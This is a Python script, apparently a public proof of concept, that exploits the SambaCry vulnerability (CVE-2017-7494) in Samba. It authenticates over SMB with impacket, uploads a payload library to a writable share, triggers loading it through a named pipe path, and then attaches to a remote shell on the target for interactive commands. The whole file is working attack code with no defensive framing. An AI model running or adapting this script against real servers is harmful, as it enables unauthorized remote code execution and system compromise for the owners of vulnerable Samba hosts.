from sys import argv, exit
from argparse import ArgumentParser
import os

from impacket.dcerpc.v5 import samr, transport, srvs
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import *

import sys
import time
import socket
from threading import Thread

def dceTrigger(dce):
    try:
        dce.connect()
    except SessionError as error:
        print("[+] Expected exception from Samba (SMB SessionError)")

def receiveAndPrint(sock):
    try:
        while True:
            data = sock.recv(8)
            if not data:
                break
            sys.stdout.write(str(data))
    except Exception, e:
        print("[-] Exception "+str(e))

def exploit(target, port, executable, remoteshare, remotepath,  user=None, password=None, remoteShellPort=None):
    """Samba exploit"""

    # Open the connection
    smbClient = SMBConnection(target, target, sess_port=port)
    if user:
        if not smbClient.login(user,password):
            raise Exception("Authentication error, invalid user or password")
        else:
            print("[+] Authentication ok, we are in !")

    # Upload the payload module
    print("[+] Preparing the exploit")
    executableName = os.path.basename(executable)
    executableFile = open(executable, 'rb')

    smbClient.putFile(remoteshare, executableName, executableFile.read)

    executableFile.close()

    # Trigger the bug in another thread, since it will be locked
    triggerModule = r'ncacn_np:%s[\pipe\%s]' % (target, remotepath)
    rpcTransport = transport.DCERPCTransportFactory(triggerModule)
    dce = rpcTransport.get_dce_rpc()
    triggerThread = Thread(target=dceTrigger, args=(dce,))
    triggerThread.daemon = True
    triggerThread.start()

    # Give some time to the exploit to run
    time.sleep(2)

    # Profit
    if not remoteShellPort:
        print("[+] Target exploited, check it")
        return

    remoteShellPort = int(remoteShellPort)

    print("[+] Exploit trigger running in background, checking our shell")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("[+] Connecting to %s at %s" % (target, str(remoteShellPort)))
        sock.connect((target, remoteShellPort))
        print("[+] Veryfying your shell...")
        command="uname -a"
    
        # Receive and print data in another thread
        receiveThread = Thread(target=receiveAndPrint, args=(sock,))
        receiveThread.daemon = True
        receiveThread.start()

        while True :
            sock.send(command)
            sock.send("\n")
            command = raw_input(">>")
        socket.close()
    except Exception, e:
        print("[-] IO error error connecting to the shell port "+str(e))


    # Cleanup

if __name__ == "__main__":
    ap = ArgumentParser(description="Sambacry (CVE-2017-7494) exploit by opsxcq")
    ap.add_argument("-t", "--target", required=True, help="Target's hostname")
    ap.add_argument("-e", "--executable", required=True, help="Executable/Payload file to use")
    ap.add_argument("-s", "--remoteshare", required=True, help="Executable/Payload shared folder to use")
    ap.add_argument("-r", "--remotepath", required=True, help="Executable/Payload path on remote file system")
    ap.add_argument("-u", "--user", required=False, help="Samba username (optional")
    ap.add_argument("-p", "--password", required=False, help="Samba password (optional)")
    
    # Remote shell
    ap.add_argument("-P", "--remoteshellport", required=False, help="Connect to a shell running in the remote host after exploitation")

    args = vars(ap.parse_args())

    # TODO : Add domain name as an argument
    port = 445 # TODO : Add as an argument

    try:
        print("[*] Starting the exploit")
        exploit(args["target"], port, args["executable"], args["remoteshare"],args["remotepath"], args["user"], args["password"], args["remoteshellport"])
    except IOError:
        exit("[!] Error")
    except KeyboardInterrupt:
        print("\n[*] Aborting the  attack")